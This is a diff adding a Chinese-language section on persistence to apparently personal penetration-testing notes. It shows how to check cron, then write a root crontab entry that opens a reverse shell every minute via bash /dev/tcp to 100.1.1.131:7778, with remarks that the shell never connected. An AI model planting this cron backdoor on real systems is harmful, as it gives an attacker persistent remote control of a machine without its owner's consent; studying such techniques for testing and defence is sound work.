@@ -65,6 +65,56 @@ aria2c http://www.sample-videos.com/video/mp4/big.mp4
 
 ---
 
+## 权限维持
+
+### 计划任务(TODO)
+
+> log 显示运行了, 但是回连不上, 很奇怪
+
+检查任务计划服务是否正常运行
+
+```bash
+service cron status
+```
+
+![image-20241112155442750](http://cdn.ayusummer233.top/DailyNotes/202411121554522.png)
+
+---
+
+查看当前计划任务
+
+```bash
+crontab -l
+```
+
+![image-20241112155919656](http://cdn.ayusummer233.top/DailyNotes/202411121559597.png)
+
+---
+
+写入计划任务
+
+```bash
+echo "*/1 * * * * bash -i >& /dev/tcp/100.1.1.131/7778 0>&1" > /var/spool/cron/crontabs/root
+
+echo "*/1 * * * * echo 233>>/tmp/233" >> /var/spool/cron/crontabs/root
+```
+
+---
+
+要删除这个计划任务需要编辑 `/var/spool/cron/crontabs/root`文件, 把这行删除即可
+
+---
+
+> 奇怪的是 log 显示运行完了, 但是收不到 shell:
+>
+> ![image-20241112180823702](http://cdn.ayusummer233.top/DailyNotes/202411121808685.png)
+>
+> ![image-20241112181122435](index.assets/image-20241112181122435.png)
+
+
+
+
+
 
 
 
